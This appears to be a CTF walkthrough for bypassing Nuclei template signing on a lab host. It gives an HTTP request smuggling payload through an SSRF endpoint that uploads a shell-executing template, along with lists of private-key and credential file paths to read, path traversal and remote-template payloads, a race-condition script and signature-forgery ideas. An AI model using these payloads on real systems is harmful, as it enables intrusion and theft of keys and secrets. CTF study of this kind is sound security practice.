# CTF Challenge: Nuclei Template Signing Bypass

## Challenge Overview

The challenge involves:
1. HTTP Request Smuggling via `/api/fetch` endpoint
2. Internal `httpd` server with a scanner (nuclei-based) feature
3. Templates require signing with a private key
4. Goal: Execute `/readflag` and retrieve the flag

## Your Working Exploit (Local)

```
# Upload template
POST /api/fetch HTTP/1.1
Host: <target>
Content-Type: application/json

{"endpoint": "//httpd/site/scanner%20HTTP/1.1%0d%0aHost:%20httpd%0d%0aContent-Length:%200%0d%0a%0d%0aPOST%20/index.php%3fpage=scanner%20HTTP/1.1%0d%0aHost:%20httpd%0d%0aContent-Type:%20multipart/form-data;%20boundary=----abc%0d%0aContent-Length:%20463%0d%0a%0d%0a------abc%0d%0aContent-Disposition:%20form-data;%20name=%22yaml_file%22;%20filename=%22signed.yaml%22%0d%0aContent-Type:%20text/plain%0d%0a%0d%0aid:%20getflag%0ainfo:%0a%20%20name:%20getflag%0a%20%20author:%20x%0a%20%20severity:%20high%0acode:%0a%20%20-%20engine:%0a%20%20%20%20%20%20-%20sh%0a%20%20%20%20source:%20|%0a%20%20%20%20%20%20/readflag%20%3E%20/var/www/html/f.txt%0a%23%20digest:%20<SIGNATURE>:<KEY_HASH>%0d%0a------abc--%0d%0a"}
```

## Bypass Techniques

### 1. Leak the Private Key

Most promising paths to try:

```bash
# Standard nuclei key locations
/root/.nuclei/keys/private-key.pem
/home/www-data/.nuclei/keys/private-key.pem
/var/www/.nuclei/keys/private-key.pem
/.nuclei/keys/private-key.pem
/app/.nuclei/keys/private-key.pem

# Environment variables
/proc/self/environ
/proc/1/environ

# Config files
/var/www/html/.env
/app/.env
/etc/nuclei/config.yaml
```

Try via direct SSRF:
```json
{"endpoint": "//httpd/root/.nuclei/keys/private-key.pem"}
```

Try via PHP LFI (if page param is vulnerable):
```json
{"endpoint": "//httpd/index.php?page=php://filter/convert.base64-encode/resource=/root/.nuclei/keys/private-key.pem"}
```

### 2. Unsigned Template (Old Nuclei Versions)

Some nuclei versions don't require signatures or have opt-out:

```yaml
id: getflag
info:
  name: getflag
  author: x
  severity: high
code:
  - engine:
      - sh
    source: |
      /readflag > /var/www/html/f.txt
```

### 3. Malformed Signature

Try signatures that might bypass verification:

```yaml
# Empty signature
# digest: :

# Null signature  
# digest: 00:00

# Skip marker
# digest: skip

# Invalid but might be ignored
# digest: AAAA:BBBB

# Double digest (first might be skipped)
# digest: invalid
# digest: <real_signature>
```

### 4. Different Template Types

HTTP/file templates might have different signing requirements:

```yaml
id: http-template
info:
  name: http
  author: x
  severity: high

http:
  - method: GET
    path:
      - "{{BaseURL}}"
```

### 5. Path Traversal in Template Name

When executing, try different template paths:

```
template=../../../tmp/unsigned.yaml
template=....//....//tmp/unsigned.yaml  
template=file:///tmp/unsigned.yaml
template=http://your-server/template.yaml
```

### 6. YAML Anchors/Aliases

YAML anchors might confuse the signature verification:

```yaml
id: getflag
info: &i
  name: getflag
  author: x
  severity: high
code: &c
  - engine:
      - sh
    source: &s |
      /readflag > /var/www/html/f.txt
# digest: <signature>
```

### 7. Race Condition

Upload and execute in rapid succession before signature check:

```python
import threading
import requests

def upload():
    requests.post(url, json={"endpoint": upload_payload})

def execute():
    requests.post(url, json={"endpoint": execute_payload})

# Start multiple threads
for i in range(10):
    t1 = threading.Thread(target=upload)
    t2 = threading.Thread(target=execute)
    t1.start()
    t2.start()
```

### 8. Scanner Parameter Override

Try adding parameters to disable signature verification:

```
target=http://0.0.0.0&template=pwn.yaml&validate=false
target=http://0.0.0.0&template=pwn.yaml&no-verify=true
target=http://0.0.0.0&template=pwn.yaml&debug=true
```

### 9. Workflow Templates

Workflows might bypass signature checks:

```yaml
id: workflow
info:
  name: workflow
  author: x
  severity: high

workflows:
  - template: http://your-server/unsigned.yaml
```

### 10. Unicode/Null Byte Injection

Try confusing the parser:

```yaml
# dige​st: fake  (zero-width space)
# digest: test\x00real  (null byte)
```

## Using the Exploit Scripts

```bash
# Run the main exploit
python3 ctf_final_exploit.py 50rogu0a8m01.ctfhub.io

# Run the nuclei bypass checker
python3 nuclei_bypass.py

# Basic bash exploit
./exploit.sh 50rogu0a8m01.ctfhub.io
```

## If You Get the Key

If you successfully leak the private key:

```bash
# Install ecdsa
pip install ecdsa

# Sign your template
python3 nuclei_signer.py test-sign leaked_key.pem
```

This will output a properly signed template you can use in the exploit.

## Key Insights

1. The digest format is: `# digest: 490a<ECDSA_DER_SIG>:<MD5_OF_PUBLIC_KEY>`
2. Nuclei uses NIST P-256 (secp256r1) curve for signatures
3. The signature covers the entire template EXCEPT the digest line itself
4. Version `490a` prefix indicates signature format version

## Debugging Tips

1. Check responses carefully - error messages might leak info
2. Try accessing debug endpoints: `/debug`, `/phpinfo.php`, `/status`
3. Look for git exposure: `/.git/config`
4. Check for backup files: `.bak`, `.old`, `~`
5. Try different HTTP methods: OPTIONS, PUT, PATCH
